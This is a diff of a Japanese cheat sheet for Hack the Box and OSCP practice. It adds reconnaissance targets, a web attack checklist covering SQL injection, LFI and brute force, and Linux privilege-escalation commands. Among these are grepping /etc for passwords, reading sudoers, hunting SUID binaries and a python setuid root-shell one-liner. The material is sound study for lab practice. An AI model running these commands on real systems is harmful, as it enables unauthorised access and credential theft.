@@ -11,6 +11,7 @@ Hack the Box の攻略や、OSCP 取得を目指すためのチートシート�
 - [Network Scan](#Network_scan)
   - [Nmap](#nmap)
   - [AutoRecon](#autorecon)
+- [偵察 基本戦略](#偵察 基本戦略)
 - [HTTP](#http)
 - [SSH](#ssh)
 - [SMB](#smb)
@@ -151,6 +152,51 @@ nmap -Pn -p 445 --script vuln 10.10.10.4
 AutoReconは、まずTCPのデフォルト1000ポートスキャンのNmapScanを実行し、そこで見つかったサービスに対して、個別にNmapのVulnスクリプトやNikto、enum4linuxなどを実行する。
 同時並行でTCP fullNmapScanも実行し、そこで新たに見つかったサービスに対してもさらにNmapなどを実行してくれる。
 
+
+# 偵察 基本戦略
+
+```
+着目すべきポート
+80/TCP:HTTP, 443/TCP:HTTPS
+　->各ページにある脆弱性を使える
+
+135/TCP:MSRPC, 139/TCP:NetBios-SSN, 445/TCP:Microsoft-DS
+　->Eternal Blueなどが使える
+
+21/TCP:FTP
+　->anonymousユーザなどでファイルの中身を見たり、アップロードしたりできる
+
+22/TCP:SSH
+　->BruteForceにより突破できるかも
+
+389, 636:LDAP
+　->ActiveDirectoryに関する脆弱性があるかも
+ ```
+
+
+# HTTP
+
+### minimum todo
+
+```
+
+- robots.txt，sitemap.xmlの確認
+- サブドメインの列挙
+- ディレクトリスキャナーの使用(ffuf, gobuster, dirb, nikto はmust)
+- CMSの特定
+- ログインの試行
+  - デフォルトパスワードの入力
+  - パスワード推測
+  - SQLインジェクションの試行
+  - Webサイト上にある情報からユーザー/パスワードリストの作成
+  - ブルートフォース
+- BurpSuiteを用いてWebの挙動の確認
+- URLを見て、LFIの脆弱性が無いか確認
+- upload機構がある場合、バイパス方法の模索
+- 掲載されている画像にヒントが無いか確認
+
+```
+
 # SSH
 
 ### SCP
@@ -218,30 +264,6 @@ enum4linux -P <target ip>
 - -o...OS情報取得
 - -S...sharelist取得
 - -P...password policy情報取得
-
-```
-
-
-# HTTP
-
-### minimum todo
-
-```
-
-- robots.txt，sitemap.xmlの確認
-- サブドメインの列挙
-- ディレクトリスキャナーの使用(ffuf, gobuster, dirb, nikto はmust)
-- CMSの特定
-- ログインの試行
-  - デフォルトパスワードの入力
-  - パスワード推測
-  - SQLインジェクションの試行
-  - Webサイト上にある情報からユーザー/パスワードリストの作成
-  - ブルートフォース
-- BurpSuiteを用いてWebの挙動の確認
-- URLを見て、LFIの脆弱性が無いか確認
-- upload機構がある場合、バイパス方法の模索
-- 掲載されている画像にヒントが無いか確認
 
 ```
 
@@ -522,21 +544,60 @@ run
 
 ### minimum todo
 
+
+
+- Linux Distribution, Kernel version, cpu architecture の確認
+
+```
+cat /etc/*issue # linux distribution
+cat /etc/*release # linux distribution
+uname -a # hostname, kernel version, cpu architecture (32-bit vs. 64-bit)
+
+uname がない場合は
+dmesg | head -n1 
+```
+
+- network の確認
+
+```
+
+cat /etc/network/interfaces # show network config
+cat /etc/sysconfig/network # show network config
+iptables -xvL # show firewall rules
+netstat -antpl # which ports and connections are services exposing?
+ss -antpl # if 'netstat' doesn't exist
+
+```
+
+
+- 特権アクセスの確認
+
+```
+cat /etc/sudoers # can we read? which users have sudo privileges?
+sudo -l # can we use sudo? do we need a password?
+ls -al /root # can we read /root?
+ls -alR /home # check permissions for /home directories
+```
+
 - SUID binaries と capabilitiesを探す
 
 ```
+find / -writable -type d 2>/dev/null # show writable folders
+find / -writable -type f 2>/dev/null # show writable files
+find / -perm -4000 -type f 2>/dev/null # search system for suid files
 find / -perm -u=s -type f 2>/dev/null
+
 getcap -r / 2>/dev/null 
 
 ex: これで、python がでてきたら。
 
 python -c 'import os; os.setuid(0); os.system("/bin/bash")'
 
-上記でpython 以外が出てきたら、[gtfobins](https://gtfobins.github.io/) から、該当のコマンドを探す。
 ```
 
+上記でpython 以外が出てきたら、[gtfobins](https://gtfobins.github.io/) から、該当のコマンドを探す。
 
-- ある特定のファイルが定期実行されているか
+- ある特定のファイルが定期実行されているか？
 
 ```
 cat /etc/crontab 
@@ -556,39 +617,27 @@ ps -ef | grep <process_name>
 - その他
 
 ```
-ls /dev 2>/dev/null | grep -i "sd" 
 
-cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null 
-
+// etc配下のファイルにある文字列列挙
 grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null 
+grep -Ri password $(find /etc -name '*.conf' 2>/dev/null) 
+
+// show installed packages and versions
+dpkg -l 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/" 
+
+
+// 環境変数にキーやパスワードがあったり、隠れたbinファイルをPATHで見つける
+echo $PATH # current value of PATH
+env # display environment information
+
 
 which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null 
 
-dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/" 
+ls /dev 2>/dev/null | grep -i "sd" 
 
+cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null 
 ```
 
-
-### search SUID binaries and capabilities
-
-
-・　capability
-
-[Cap write up]
-
-[解説リンク](https://k1low.hatenablog.com/entry/2020/07/03/083000)
-
-
-```
-
-getcap -r / 2>/dev/null
-
-
-
-
-・var/log/syslog 見て、ある特定のファイルが定期実行されているなどの手がかりを見にいく。
-
-・道中、何らかのpassword が得られたら、`sudo -l` で昇格できるか検証する。
 
 
 # 特権エスカレーション基本戦略 (Windows)
